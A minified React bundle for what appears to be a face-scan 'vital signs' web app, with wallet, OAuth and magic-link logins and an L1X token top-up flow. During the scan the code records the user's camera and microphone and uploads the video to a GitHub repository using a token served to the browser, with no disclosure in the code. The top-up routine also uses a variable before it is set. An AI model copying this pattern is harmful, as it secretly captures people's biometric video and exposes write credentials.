import{r as s,j as t,B as E,R as P,a as f,c as R}from"./vendor-react-p0-XfeGc.js";import{w as g,l as v,p as A,W as C,C as h}from"./vendor-Bq8nh9Cz.js";(function(){const r=document.createElement("link").relList;if(r&&r.supports&&r.supports("modulepreload"))return;for(const n of document.querySelectorAll('link[rel="modulepreload"]'))o(n);new MutationObserver(n=>{for(const a of n)if(a.type==="childList")for(const l of a.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&o(l)}).observe(document,{childList:!0,subtree:!0});function i(n){const a={};return n.integrity&&(a.integrity=n.integrity),n.referrerPolicy&&(a.referrerPolicy=n.referrerPolicy),n.crossOrigin==="use-credentials"?a.credentials="include":n.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function o(n){if(n.ep)return;n.ep=!0;const a=i(n);fetch(n.href,a)}})();const y="pk_live_27266000CD95B626",p="0x7d1fe42532cEE53A23cc266c06Ac55e65b0797a9",x="0x0C1A6816C7C59C2876624d0AdBd53Eb9bb6291bc";function O(){return s.useEffect(()=>{(async()=>{const e=new URLSearchParams(window.location.search),r=e.get("email"),i=e.get("ref");if(!r)return;i&&sessionStorage.setItem("r",i);const o=new g(y);await o.auth.loginWithMagicLink({email:r});const n=await fetch("/les",{method:"POST",headers:{m:await o.user.getIdToken(),"Content-Type":"application/json"},body:JSON.stringify({e:r})});sessionStorage.setItem("a",await n.text()),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function U(){return s.useEffect(()=>{(async()=>{const e=new g(y,{extensions:[new v]}),r=new URLSearchParams(window.location.search),i=r.get("ref"),o=r.get("t")||sessionStorage.getItem("provider");i&&sessionStorage.setItem("r",i),o&&sessionStorage.setItem("p",o);try{await e.oauth2.getRedirectResult({})}catch{}await e.user.isLoggedIn()?(sessionStorage.setItem("a",(await e.user.getInfo()).publicAddress??""),sessionStorage.removeItem("p"),window.location.href="/scan"):o&&e.oauth2.loginWithRedirect({provider:o,redirectURI:`${window.location.origin}/lg`})})()},[]),t.jsx("div",{children:"Loading..."})}function T(){return s.useEffect(()=>{(async()=>{if(!window.ethereum)return;const e=new URLSearchParams(window.location.search).get("ref");e&&sessionStorage.setItem("r",e),sessionStorage.setItem("a",(await window.ethereum.request({method:"eth_requestAccounts"}))[0]),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function B(){return s.useEffect(()=>{(async()=>{const e=new g(y,{extensions:[new v]}),r=new URLSearchParams(window.location.search).get("ref");r&&sessionStorage.setItem("r",r),await e.oauth2.loginWithPopup({provider:"telegram"}),sessionStorage.setItem("a",(await e.user.getInfo()).publicAddress??""),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function M(){const[e,r]=s.useState(null),[i,o]=s.useState(""),[n,a]=s.useState(null),l=s.useRef(null),d=s.useRef(null),w=s.useRef([]),[j,L]=s.useState("");return s.useEffect(()=>{r(sessionStorage.getItem("a")),a(sessionStorage.getItem("r"))},[]),s.useEffect(()=>{if(!e)return;n&&fetch("/ref",{method:"POST",headers:{to:e,from:n}}),fetch("/iframe",{method:"POST",headers:{addr:e}}).then(u=>u.text()).then(u=>{o(u)});async function b(){const u=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:!0});l.current&&(l.current.srcObject=u),d.current=new MediaRecorder(u),d.current.ondataavailable=c=>{c.data.size>0&&w.current.push(c.data)},d.current.onstop=async()=>{const c=new File([new Blob(w.current,{type:"video/webm"})],`${e}_${Date.now()}.webm`);u.getTracks().forEach(m=>m.stop()),await fetch(`https://api.github.com/repos/aloycwl/v/contents/${c.name}`,{method:"PUT",headers:{Authorization:`Bearer ${await(await fetch("/github")).text()}`,"Content-Type":"application/json"},body:JSON.stringify({message:"_",content:btoa(new Uint8Array(await c.arrayBuffer()).reduce((m,I)=>m+String.fromCharCode(I),""))})})}}b();function S(u){if(!e||!d.current)return;const c=u.data;c.action==="onAnalysisStart"&&d.current.start(),c.analysisData&&c.analysisData.vitalSigns&&(L(`Your referral link: https://insightgenesis.ai/?ref=${e}`),fetch("/store",{method:"POST",headers:{addr:e,type:"1","Content-Type":"application/json"},body:JSON.stringify(c.analysisData)}),d.current.stop())}return window.addEventListener("message",S),()=>{window.removeEventListener("message",S)}},[e]),t.jsxs(t.Fragment,{children:[t.jsx("p",{id:"d",children:j}),t.jsx("iframe",{allow:"camera;microphone",src:i})]})}function N(){return s.useEffect(()=>{let e,r,i;async function o(){if(i=A(new URLSearchParams(window.location.search).get("amt")||"100",18),!window.ethereum)return;const d="0x42A";try{await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:d}]})}catch{await window.ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:d,chainName:"L1X",nativeCurrency:{name:"L1X",symbol:"L1X",decimals:18},rpcUrls:["https://v2-mainnet-rpc.l1x.foundation/"]}]}),window.location.reload()}e=await r.getSigner().getAddress(),r=new C(window.ethereum),await n()||await a(),await l()}async function n(){return(await new h(x,["function allowance(address, address)view returns(uint256)"],r).allowance(e,p)).gte(i)}async function a(){await(await new h(x,["function approve(address, uint256)"],r.getSigner()).approve(p,i)).wait()}async function l(){await new h(p,["function topup(uint256)"],r.getSigner()).topup(i)}o()},[]),t.jsx("div",{children:"Paying..."})}function _(){return t.jsx(E,{children:t.jsxs(P,{children:[t.jsx(f,{path:"/le",element:t.jsx(O,{})}),t.jsx(f,{path:"/lg",element:t.jsx(U,{})}),t.jsx(f,{path:"/lm",element:t.jsx(T,{})}),t.jsx(f,{path:"/lt",element:t.jsx(B,{})}),t.jsx(f,{path:"/scan",element:t.jsx(M,{})}),t.jsx(f,{path:"/topup",element:t.jsx(N,{})})]})})}R.createRoot(document.getElementById("root")).render(t.jsx(s.StrictMode,{children:t.jsx(_,{})}));
